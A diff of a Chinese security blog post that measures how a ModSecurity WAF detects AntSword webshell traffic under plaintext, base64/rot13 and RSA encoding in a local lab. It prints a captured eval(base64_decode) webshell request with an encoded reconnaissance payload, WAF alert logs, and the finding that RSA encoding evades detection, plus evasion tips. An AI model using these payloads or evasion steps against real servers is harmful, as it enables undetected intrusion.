class="line">ant=%40eval(%40base64_decode(%24_POST%5Bq9c4fa426fb243%5D))%3B&amp;q9c4fa426fb243=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzRhZTE3IjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICI1YmJhN2YiO31vYl9zdGFydCgpO3RyeXskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfQkiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkMiLCJaIilhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fWVsc2V7JFIuPSIvIjt9JFIuPSIJIjskdT0oZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRlZ2lkIikpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKToiIjskcz0oJHUpPyR1WyJuYW1lIl06QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIJeyRzfSI7ZWNobyAkUjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure>
+<p>base64加密之后的流量除了eval之外至少不会包含那么多的高危函数，加密之后我们再来测试。</p>
+<h5 id="Base64-amp-amp-rot13-webshell流量检测"><a href="#Base64-amp-amp-rot13-webshell流量检测" class="headerlink" title="Base64&amp;&amp;rot13 webshell流量检测"></a>Base64&amp;&amp;rot13 webshell流量检测</h5><p>waf测试结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Message: Warning. Pattern match &quot;^[\\d.:]+$&quot; at REQUEST_HEADERS:Host. [file </span><br><span class="line">Message: Warning. Matched phrase &quot;base64_decode&quot; at ARGS:ant. [file &quot;/etc/httpd/modsecurity.d/owasp-modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf&quot;] [line &quot;301&quot;] [id &quot;933150&quot;] [msg &quot;PHP Injection Attack: High-Risk PHP Function Name Found&quot;] [data &quot;Matched Data: base64_decode found within ARGS:ant: @eval(@base64_decode($_post[y07ae431d0730c]));&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-php&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-injection-php&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/PHP_INJECTION&quot;] [tag &quot;OWASP_TOP_10/A1&quot;]</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>统计数据如下<br>| Apache-Error | Message | 匹配规则数 | level |<br>| ———— | ——- | ———- | —– |<br>| 7            | 7       | 14         | 3     |</p>
+<p>通过Antsword界面配置rot13加密及解密，抓包看了下流量，仅仅是将base64的加密函数变成了str_rot13</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=%40eval(%40base64_decode -&gt; ant=%40eval(%40str_rot13(</span><br></pre></td></tr></table></figure>
+<p>拦截数据和base差不多，waf统计数据如下<br>| Apache-Error | Message | 匹配规则数 | level |<br>| ———— | ——- | ———- | —– |<br>| 10           | 7       | 14          | 3     |<br>由此可见，对称加密算法下eval、base64,rot13这些函数也是可以触发较高告警等级的。但是相比于明文传输，触发的告警会少一半，于是笔者进一步尝试一下antsword提供的非对称加密算法。</p>
+<h5 id="RSA加密流量配置"><a href="#RSA加密流量配置" class="headerlink" title="RSA加密流量配置"></a>RSA加密流量配置</h5><p>版本&gt;=2.1.0开始，Antsword作者新增了RSA模式。蚁剑默认下仅支持PHP。另外需要Server开启<code>php_openssl</code>拓展。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改php.ini，去掉extension=php_openssl.dll前的注释，重启Apache</span><br></pre></td></tr></table></figure>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Antsword-&gt;系统设置-&gt;编码管理-&gt;新建编码器-&gt;PHP RSA-&gt;命名为rsa_php-&gt;</span><br><span class="line">点击RSA配置-&gt;生成</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/5.png" alt="avatar"></p>
+<ol>
+<li>将下方的php代码copy到虚拟机里，命名为rsa.php</li>
+<li>配置antsword连接类型选择rsa_php</li>
+<li>测试连接<h5 id="RSA加密流量分析"><a href="#RSA加密流量分析" class="headerlink" title="RSA加密流量分析"></a>RSA加密流量分析</h5>贴上wireshark抓的流量<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /rsa.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1712</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">ant=W%2B9beN7Ltke390bzZGS5JbOBCnO8SRXW6Z8w0WaMF6CdAymaCu6NeWE9FX0kyCFs3jaLkDWkEvcTsSC2gEu85l5ugsVJUK6bTWFlVNeRBoezjTjUJZdjGvnjrxjd5Pn4iZaRjoaxAZPeZP2ozupbevWFUId4ZzkKZ7bIVPrZKk4%3D%7CYjt1kz5Gkj2N6Ajkqp3VXcg%2FEA7emPXV6oyTwZAZS9Ux1%2Fpby5PIuU9LsMZmGlMqGXvRFO23is9MUJpF66yboIAIYqpGRJCDgSP4S%2BfG6DD0lRYGEOIEsfpaLSVMhxZtR6OnFXp%2FfbXqmgGUk0a8HCUfQ83XmXS%2BRsl0Yx2PFc4%3D%7CAWtIrpychlQENib6basrK89LJcjnKk%2Bf5mVM72MOnPHxaviQFXws2TKNdGPI4SI9%2Fkwl%2FUGqB22s6NOwCza1f%2BkzGK7FqEciITMZMNFbokFsmjG8IiWkRO%2B%2BbWWnsMesfavJub9aEln41x8U97WjgKGKMMdqXZHrIRS4KU8pQhU%3D%7CXLL0DnlWOLx3hNXd2VGzmbdcgmtQoiyiiPNQCiBkAbUK1mLM14l6f22Pkl2tSSw%2F9dYIkdZ91wUok9GHDBMmKkL6D%2BJGQxrJDyQXEfytOzfzZmKqp%2BJ%2BryVm2zwLJMXTdpZ%2BUsBWgVzlD%2Bxga6%2F7rCqkG%2FtaWM6e%2BGegcS4lWTE%3D%7CJGJR50q4jSkL028qffvT%2Be%2BnJcMQth6jz86sntyuI3GZQUtjS5%2FoCByIqsGi8zPwCKS0J%2FAEiEGhAwN7%2FBQXYjyVWAs5VpDhPrVUs7EbqFgllVmrNt8T5Rt7O%2FCHVSiR2AQjyG%2BxB1LjO5ElX%2FH8Pfh25dDpVaFt3MEr1lxT69I%3D%7CSIirF52ZEhs%2FMBfco2kWouurB%2F%2FhCvLG29%2BK70a6t8Io%2FE%2F7VL5IO38s2j%2Bjq%2BSw6dUDL9cEUbEx2G2U4r0fHiDSYPbbn9WS6FbQSCPHxG6lxLHCXmmkKxj%2B2P8khyMM%2FHdVCWai%2B5L5hXYr%2BUWFkCkbv%2BUyYUSsfL29sGxWeVA%3D%7Ci1qZBSL6Dfu31cisSj3J%2BY7epLuQl62DdEWMCiZRQOz5AHFsPFsWtO59uedRC0CfMOhcbIDGGq2GNThL8VPz%2FUfLJTd3kuoFo7p225iPcYOKJS75V36ccHw3bMI3LOWcEhUF3LPX2YcaLSvwDDyHfrnWL2Qj6VmQKew8edoAIdU%3D%7CkJih3pPT70J6BiPll9o4PtH%2Byl%2BmB8%2BUPDAS%2FfAu4uzi2yDMCIdzdkaFLlnsUKewHXLf1mWWVpGkfqLCttgZed9wUtl6N22C3nQGZqZ%2FqnNiKeBYK0%2FJBmimOAf7nSMB1WF%2Bab5RmRq6cSSwrWc4ya93kVJzmIg1BdyaiycdN5I%3D%7CHV2y7vs6wQUIQ8DnvveCeD8xtjRecf%2F%2B7rAl7Y4Wa8S4Y0onKYHOz2Nz0hgBJtFN%2BLRIj9%2B%2FYyOq%2Fslq0XW%2BolQCUl5hf8%2F3Y9OmlxKvSCGf3A0IIAquqSaJXpU4w8rqVyP9Od2bgDXDzsOx8YgVdigeyZxLS0TNNODTGIATb7Y%3DHTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 30 Jan 2020 05:47:09 GMT</span><br><span class="line">Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.6.40</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Content-Length: 133</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">8ee773/var/www/html./.Linux localhost.localdomain 3.10.0-1062.9.1.el7.x86_64 <span class="comment">#1 SMP Fri Dec 6 15:49:49 UTC 2019 x86_64.apache47970246</span></span><br></pre></td></tr></table></figure>
+经历非对称加密算法之后,整个流量传输的数据除了length之外,肉眼已经分别不出来, 这个效果笔者比较满意.<h5 id="RSA加密流量检测"><a href="#RSA加密流量检测" class="headerlink" title="RSA加密流量检测"></a>RSA加密流量检测</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Message: Warning. Pattern match <span class="string">"^[\\d.:]+$"</span> at REQUEST_HEADERS:Host. [file <span class="string">"/etc/httpd/modsecurity.d/owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</span>] [line <span class="string">"708"</span>] [id <span class="string">"920350"</span>] [msg <span class="string">"Host header is a numeric IP address"</span>] [data <span class="string">"192.168.1.13"</span>] [severity <span class="string">"WARNING"</span>] [ver <span class="string">"OWASP_CRS/3.2.0"</span>] [tag <span class="string">"application-multi"</span>] [tag <span class="string">"language-multi"</span>] [tag <span class="string">"platform-multi"</span>] [tag <span class="string">"attack-protocol"</span>] [tag <span class="string">"paranoia-level/1"</span>] [tag <span class="string">"OWASP_CRS"</span>] [tag <span class="string">"OWASP_CRS/PROTOCOL_VIOLATION/IP_HOST"</span>] [tag <span class="string">"WASCTC/WASC-21"</span>] [tag <span class="string">"OWASP_TOP_10/A7"</span>] [tag <span class="string">"PCI/6.5.10"</span>]</span><br><span class="line">Apache-Handler: php5-script</span><br><span class="line">Stopwatch: 1580363229118571 7666 (- - -)</span><br><span class="line">Stopwatch2: 1580363229118571 7666; combined=6153, p1=574, p2=5170, p3=39, p4=156, p5=213, sr=205, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity <span class="keyword">for</span> Apache/2.9.2 (http://www.modsecurity.org/); OWASP_CRS/3.2.0.</span><br><span class="line">Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.6.40</span><br><span class="line">Engine-Mode: <span class="string">"DETECTION_ONLY"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| Apache-Error | Message | 匹配规则数 | level |</span><br><span class="line">| ------------ | ------- | ---------- | ----- |</span><br><span class="line">| 1            | 1       | 1          | --    |</span><br></pre></td></tr></table></figure>
+waf也只能检测到Host header is a numeric IP address,这基本是说waf对于RSA加密的webshell流量基本没什么防护能力，往后的安全设备检测只能依赖于杀毒软件。<br>这样的加密程度对笔者本次实验来说已经够用了。但是同样还存在着很多很多的问题，比如绕杀软，混淆代码等等，每一个方向都需要专注、细心、长久的投入。<br>PS:隐藏攻击流量也可以通过改UA,设置multi发包,花样过狗过盾甚至过人等等。<br>过狗千万条,安全第一条,连马不谨慎,队友两行泪。<br>参考链接:<br><a href="http://www.test666.me/archives/289/" target="_blank" rel="noopener">http://www.test666.me/archives/289/</a><br><a href="https://www.cnblogs.com/jianmingyuan/p/5900064.html" target="_blank" rel="noopener">https://www.cnblogs.com/jianmingyuan/p/5900064.html</a> </li>
+</ol>
 
       
 
@@ -234,33 +271,7 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">流量分析</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">菠菜</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/安全事件分析//" class="article-tag-list-link color2">安全事件分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
 
       
 
@@ -310,7 +321,7 @@
     <a class="close js-modal-close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/22/%E8%8F%A0%E8%8F%9C%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BC%AA%E8%A3%85%E6%96%B9%E5%BC%8F/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/01/29/%E5%8A%A0%E5%AF%86%E8%BF%9E%E6%8E%A5webshell%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -324,18 +335,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/12/02/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          无线WiFi流量的抓取与分析(一)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/11/17/Pi+hexo+freemyip+vpn/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Pi+hexo+freemyip+vpn = ?</div>
+    <a href="/2020/01/26/OpenVas%E9%85%8D%E7%BD%AEslave%E7%9A%84debug%E4%B9%8B%E8%B7%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">OpenVas配置slave的debug之路</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -362,7 +364,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、-背景"><span class="toc-number">1.</span> <span class="toc-text">一、 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、分析过程"><span class="toc-number">2.</span> <span class="toc-text">二、分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-判断是否为服务器被黑"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 判断是否为服务器被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-判断是否是首页的JS跳转"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 判断是否是首页的JS跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首页-gt-js跳转-gt-菠菜网站"><span class="toc-number">2.2.1.</span> <span class="toc-text">首页 -&gt; js跳转-&gt; 菠菜网站</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-推测菠菜的思路"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 推测菠菜的思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-模拟百度spider"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 模拟百度spider</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、-总结"><span class="toc-number">3.</span> <span class="toc-text">三、 总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#本地环境组建"><span class="toc-number">2.</span> <span class="toc-text">本地环境组建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击流量配置、分析、检测"><span class="toc-number">3.</span> <span class="toc-text">攻击流量配置、分析、检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#明文php-webshell配置"><span class="toc-number">3.1.</span> <span class="toc-text">明文php-webshell配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#明文流量分析"><span class="toc-number">3.2.</span> <span class="toc-text">明文流量分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#明文流量检测"><span class="toc-number">3.3.</span> <span class="toc-text">明文流量检测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64-amp-amp-rot13-webshell配置"><span class="toc-number">3.4.</span> <span class="toc-text">Base64&amp;&amp;rot13 webshell配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64-amp-amp-rot13-流量分析"><span class="toc-number">3.5.</span> <span class="toc-text">Base64&amp;&amp;rot13 流量分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64-amp-amp-rot13-webshell流量检测"><span class="toc-number">3.6.</span> <span class="toc-text">Base64&amp;&amp;rot13 webshell流量检测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RSA加密流量配置"><span class="toc-number">3.7.</span> <span class="toc-text">RSA加密流量配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RSA加密流量分析"><span class="toc-number">3.8.</span> <span class="toc-text">RSA加密流量分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RSA加密流量检测"><span class="toc-number">3.9.</span> <span class="toc-text">RSA加密流量检测</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -387,7 +389,7 @@
 <script src="https://billts.site/js/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "菠菜的一种伪装方式",
+  id: "waf对webshell流量检测的性能分析",
   owner: 'canbaoafeizai',
   repo: 'canbaoafeizai.github.io',
   oauth: {
